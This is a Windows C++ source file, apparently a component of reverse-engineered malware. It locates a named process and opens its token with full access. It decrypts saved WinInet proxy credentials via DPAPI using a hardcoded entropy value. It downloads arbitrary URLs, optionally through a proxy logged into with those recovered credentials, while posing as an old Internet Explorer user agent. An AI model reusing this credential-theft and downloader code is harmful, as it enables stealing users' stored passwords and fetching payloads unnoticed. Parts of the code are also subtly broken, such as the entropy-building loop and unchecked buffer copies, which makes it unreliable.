// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "proxy.hpp"

#include <iostream>
#include <TlHelp32.h>
#include <WinCred.h>
#include <Dpapi.h>
#include "StdAfx.hpp"

BOOL GetProcessHandle(PHANDLE lpTokenHandle, char *lpszProcName)
{
	if (NULL == lpszProcName)
		return NULL;
	
	PROCESSENTRY32 pe = {};
	
	__tfnCreateToolhelp32Snapshot lpfnCreateToolhelp32Snapshot = (__tfnCreateToolhelp32Snapshot)GetProcAddress(
		LoadLibrary("kernel32.dll"),
		"CreateToolhelp32Snapshot"
	);
	HANDLE hSnapshot = lpfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (INVALID_HANDLE_VALUE == hSnapshot)
		return NULL;
	
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hSnapshot, &pe))
	{
		for (char *i = lpszProcName; ; i = lpszProcName)
		{
			if (!strcmp(_strupr(pe.szExeFile), _strupr(i)))
				break;
			
			if (!Process32Next(hSnapshot, &pe))
				return NULL;
		}
		
		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
		BOOL bOpenedProcToken = OpenProcessToken(hProc, TOKEN_ALL_ACCESS, lpTokenHandle);
		
		CloseHandle(hProc);
		return bOpenedProcToken;
	}
	
	CloseHandle(hSnapshot);
	return NULL;
}

static const char sc_szEntropyString[37] = "abe2869f-9b47-4cd9-a358-c22904dba7f7";

BOOL SearchCredentials(const char *lpszSearchTerm, char *lpszUser, char *lpszPsw)
{
	WORD awEntropy[38];
	WORD *v6 = awEntropy;
	
	WORD *k = awEntropy;
	for (int i = 0; i < 37; i++, k++)
		*v6 = sc_szEntropyString[i] * 4;
	
	DATA_BLOB pOptionalEntropy;
	
	pOptionalEntropy.cbData = 37 * sizeof(WORD);
	pOptionalEntropy.pbData = (BYTE*)awEntropy;
	
	DWORD dwCredCount;
	PCREDENTIAL *lpCred;
	if (FALSE == CredEnumerate(NULL, 0, &dwCredCount, &lpCred))
		return FALSE;
	
	DWORD j = 0;
	
	if (dwCredCount <= 0)
		return FALSE;
	
	CHAR szPsw[1024];
	CHAR szUser[1024];
	while (1)
	{
		if (CRED_TYPE_GENERIC == lpCred[j]->Type)
		{
			if (!_strnicmp(lpCred[j]->TargetName, "Microsoft_WinInet_", strlen("Microsoft_WinInet_")))
			{
				DATA_BLOB pDataIn;
				DATA_BLOB pDataOut;
				
				pDataIn.pbData = lpCred[j]->CredentialBlob;
				pDataIn.cbData = lpCred[j]->CredentialBlobSize;
				
				if (TRUE == CryptUnprotectData(&pDataIn, NULL, &pOptionalEntropy, NULL, NULL, 0, &pDataOut))
				{
					CHAR szCryptCred[1024];
					sprintf(szCryptCred, "%S", pDataOut.pbData);
					
					char *lpPsw = strchr(szCryptCred, ':');
					*lpPsw = 0;
					
					strcpy(szUser, szCryptCred);
					strcpy(szPsw, lpPsw + 1);
					
					if (strstr(lpCred[j]->TargetName, lpszSearchTerm))
						break;
				}
			}
		}
		
		if (++j >= dwCredCount)
			return FALSE;
	}
	
	strcpy(lpszUser, szUser);
	strcpy(lpszPsw, szPsw);
	
	return TRUE;
}

LPVOID GetURL_CustomProxy(LPCSTR lpszURL, DWORD *lpdwMemLength, LPINTERNET_PROXY_INFO lpProxy, DWORD dwProxySize, const char *lpszUser, const char *lpszPsw)
{
	char szHostName[MAX_PATH];
	char szExtraInfo[MAX_PATH];
	char szScheme[MAX_PATH];
	char szUrlPath[MAX_PATH];
	
	URL_COMPONENTS UrlComponents = {};
	
	UrlComponents.lpszScheme		= szScheme;
	UrlComponents.dwSchemeLength	= MAX_PATH;
	UrlComponents.lpszHostName		= szHostName;
	UrlComponents.dwHostNameLength	= MAX_PATH;
	UrlComponents.lpszUrlPath		= szUrlPath;
	UrlComponents.dwUrlPathLength	= MAX_PATH;
	UrlComponents.lpszExtraInfo		= szExtraInfo;
	UrlComponents.dwExtraInfoLength	= MAX_PATH;
	
	UrlComponents.dwStructSize		= sizeof(URL_COMPONENTS);
	
	if (NULL == InternetCrackUrl(lpszURL, 0, 0, &UrlComponents))
		return NULL;
	
	CHAR szHeaders[1024];
	sprintf(szHeaders,
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n"
		"Accept-Language: en-us\r\n"
		"Proxy-Connection: Keep-Alive\r\n"
		"Pragma: no-cache"
	);
	
	HINTERNET hInternet = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (NULL == hInternet)
		return NULL;
	
	InternetSetOption(hInternet, INTERNET_OPTION_PROXY, lpProxy, dwProxySize);
	HINTERNET hConnect = InternetConnect(hInternet, UrlComponents.lpszHostName, UrlComponents.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (NULL == hConnect)
	{
		InternetCloseHandle(hInternet);
		return NULL;
	}
	
	InternetSetOption(hConnect, INTERNET_OPTION_PROXY_USERNAME, (LPVOID)lpszUser,	strlen(lpszUser) + 1);
	InternetSetOption(hConnect, INTERNET_OPTION_PROXY_PASSWORD, (LPVOID)lpszPsw,	strlen(lpszPsw) + 1);
	
	CHAR szObjectName[MAX_PATH];
	sprintf(szObjectName, "%s%s", UrlComponents.lpszUrlPath, UrlComponents.lpszExtraInfo);
	
	HINTERNET hRequest = HttpOpenRequest(hConnect,
		"GET",
		szObjectName,
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION,
		NULL
	);
	if (NULL == hRequest)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return NULL;
	}
	
	DWORD dwTimeout = 60000;
	InternetSetOption(hRequest, INTERNET_OPTION_CONNECT_TIMEOUT,		&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_CONTROL_SEND_TIMEOUT,	&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT,		&dwTimeout, sizeof(DWORD));
	
	BOOL bRet = HttpSendRequest(hRequest, szHeaders, strlen(szHeaders), NULL, 0);
	
	DWORD dwStatusCode;
	DWORD dwBufferLength = sizeof(DWORD);
	HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &dwStatusCode, &dwBufferLength, 0);
	if (FALSE == bRet || 200 != dwStatusCode)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return NULL;
	}
	
	LPVOID lpMem = NULL;
	DWORD dwReadSize = 0;
	while (1)
	{
		if (NULL != lpMem)
		{
			if (HeapSize(GetProcessHeap(), 0, lpMem) - dwReadSize < 0x2000)
			{
				LPVOID lpNewMem = HeapReAlloc(GetProcessHeap(), 8, lpMem, HeapSize(GetProcessHeap(), 0, lpMem) + 0x2000);
				if (NULL == lpNewMem)
					break;
				
				lpMem = lpNewMem;
			}
		}
		else
		{
			lpMem = HeapAlloc(GetProcessHeap(), 8, 0x2000);
			if (NULL == lpMem)
				goto END;
		}
		
		DWORD dwRead = 0;
		if (FALSE == InternetReadFile(hRequest, ((char *)lpMem) + dwReadSize, 0x2000, &dwRead))
			break;
		
		if (0 == dwRead)
			goto END;
		
		dwReadSize += dwRead;
		*lpdwMemLength = dwReadSize;
	}
	
	HeapFree(GetProcessHeap(), 0, lpMem);
	lpMem = NULL;
	
END:
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	
	return lpMem;
}

LPVOID GetURL_NoProxy(LPCSTR lpszURL, DWORD *lpdwMemLength)
{
	char szHostName[MAX_PATH];
	char szExtraInfo[MAX_PATH];
	char szScheme[MAX_PATH];
	char szUrlPath[MAX_PATH];
	
	URL_COMPONENTS UrlComponents = {};
	
	UrlComponents.lpszScheme		= szScheme;
	UrlComponents.dwSchemeLength	= MAX_PATH;
	UrlComponents.lpszHostName		= szHostName;
	UrlComponents.dwHostNameLength	= MAX_PATH;
	UrlComponents.lpszUrlPath		= szUrlPath;
	UrlComponents.dwUrlPathLength	= MAX_PATH;
	UrlComponents.lpszExtraInfo		= szExtraInfo;
	UrlComponents.dwExtraInfoLength	= MAX_PATH;
	
	UrlComponents.dwStructSize		= sizeof(URL_COMPONENTS);
	
	if (NULL == InternetCrackUrl(lpszURL, 0, 0, &UrlComponents))
		return NULL;
	
	CHAR szHeaders[1024];
	sprintf(szHeaders,
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n"
		"Accept-Language: en-us\r\n"
		"Proxy-Connection: Keep-Alive\r\n"
		"Pragma: no-cache"
	);
	
	HINTERNET hInternet = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (NULL == hInternet)
		return NULL;
	
	HINTERNET hConnect = InternetConnect(hInternet, UrlComponents.lpszHostName, UrlComponents.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	if (NULL == hConnect)
	{
		InternetCloseHandle(hInternet);
		return NULL;
	}
	
	CHAR szObjectName[MAX_PATH];
	sprintf(szObjectName, "%s%s", UrlComponents.lpszUrlPath, UrlComponents.lpszExtraInfo);
	
	HINTERNET hRequest = HttpOpenRequest(hConnect,
		"GET",
		szObjectName,
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION,
		NULL
	);
	if (NULL == hRequest)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return NULL;
	}
	
	DWORD dwTimeout = 60000;
	InternetSetOption(hRequest, INTERNET_OPTION_CONNECT_TIMEOUT,		&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_CONTROL_SEND_TIMEOUT,	&dwTimeout, sizeof(DWORD));
	InternetSetOption(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT,		&dwTimeout, sizeof(DWORD));
	
	BOOL bRet = HttpSendRequest(hRequest, szHeaders, strlen(szHeaders), NULL, 0);
	
	DWORD dwStatusCode;
	DWORD dwBufferLength = sizeof(DWORD);
	HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &dwStatusCode, &dwBufferLength, 0);
	if (FALSE == bRet || 200 != dwStatusCode)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
		return NULL;
	}
	
	LPVOID lpMem = NULL;
	DWORD dwReadSize = 0;
	while (1)
	{
		if (NULL != lpMem && HeapSize(GetProcessHeap(), 0, lpMem) - dwReadSize < 0x2000)
		{
			if (HeapSize(GetProcessHeap(), 0, lpMem) - dwReadSize < 0x2000)
			{
				LPVOID lpNewMem = HeapReAlloc(GetProcessHeap(), 8, lpMem, HeapSize(GetProcessHeap(), 0, lpMem) + 0x2000);
				if (NULL == lpNewMem)
					break;
				
				lpMem = lpNewMem;
			}
		}
		else
		{
			lpMem = HeapAlloc(GetProcessHeap(), 8, 0x2000);
			if (NULL == lpMem)
				goto END;
		}
		
		DWORD dwRead = 0;
		if (!InternetReadFile(hRequest, ((char *)lpMem) + dwReadSize, 0x2000, &dwRead))
			break;
		
		if (0 == dwRead)
			goto END;
		
		dwReadSize += dwRead;
		*lpdwMemLength = dwReadSize;
	}
	
	HeapFree(GetProcessHeap(), 0, lpMem);
	lpMem = NULL;
	
END:
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	
	return lpMem;
}
